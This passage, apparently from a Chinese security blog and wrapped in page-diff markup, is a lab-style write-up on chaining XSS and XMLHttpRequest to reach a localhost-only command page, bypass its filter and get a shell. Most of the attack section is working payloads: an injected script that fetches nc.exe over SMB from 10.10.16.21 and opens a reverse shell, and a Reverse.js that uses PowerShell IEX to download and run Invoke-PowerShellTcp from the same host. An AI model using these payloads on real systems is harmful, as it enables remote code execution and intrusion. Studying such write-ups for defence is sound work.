+情景描述：页面端有个backdoorchecker.php页面，能够执行dir命令(限制不严，很简单就绕过)，但是只允许本地执行，直接看代码（通过SQL注入已读取到源码）
+
+简易思路:现有XSS，尝试结合XMLHttpRequest借用本地账户进行操作：借用管理员身份打开backerdoorchecker.php绕过IP限制（即转换成SSRF），并构造payload绕过命令执行限制
+漏洞利用：借助smb执行我们攻击机上的nc反弹shell （smb服务可以借助impacket套件中的smbserver.py快速搭建）Payload：
+&lt;script&gt; var x = new XMLHttpRequest(); x.open(&quot;POST&quot;, &quot;backdoorchecker.php&quot;, true); x.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;); x.send(&apos;cmd=dir xxx || \\\\10.10.16.21\\ica\\nc.exe -e cmd.exe 10.10.16.21 9999&apos;);&lt;/script&gt;nc -lvvp 9999 即可回弹shell
+#0x04、一点小小扩展这里可以把payload写到js文件中，然后插入我们的js文件即可，关于如何编写XHR的js文件的链接会放到文末。这里针对利用二，还有另外的利用方式，即通过powershell IEX下载脚本并反弹PowerShellTcp.ps1并反弹。既然提到了js文件的方式，就以这种方式构造payload：XSS框直接插入：    
+Reverse.js文件内容如下：
+function paintfunc(){
+ var http = new XMLHttpRequest();
+     var url = &apos;http://localhost/admin/backdoorchecker.php&apos;;
+     var params = &apos;cmd=dir| powershell -c &quot;iex (New-Object Net.WebClient).DownloadString(\&apos;http://10.10.16.21:8000/Invoke-PowerShellTcp.ps1\&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 9969&quot;&apos;;
+     http.open(&apos;POST&apos;, url, true);
+     http.setRequestHeader(&apos;Content-type&apos;, &apos;application/x-www-form-urlencoded&apos;);
+     http.send(params);
+}
+paintfunc();#0x05、题后话1）、关于XSS结合XHR还有更多利用，如不能登录后台的情况下添加管理员等
+2）、关于iframe没有回显的问题：这是由于iframe是通过浏览器本地同源来进行加载文件的，即不能通过网络加载，我们简单做个测试：创建iframe.html,写入如下语句
+&lt;iframe src=&quot;file:///F:/password.txt&quot;&gt;&lt;/iframe&gt;直接在本地直接打开
+
+放到网站目录下通过浏览器访问：
+
+链接：
+https://www.w3schools.com/xml/xml_http.asp 
+http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/
+https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="multi-ways-file-download" alt="multi-ways-file-download" href="/2020/04/19/multi-ways-file-download/"
                        class="post-item swiper-slide flex flex-v">
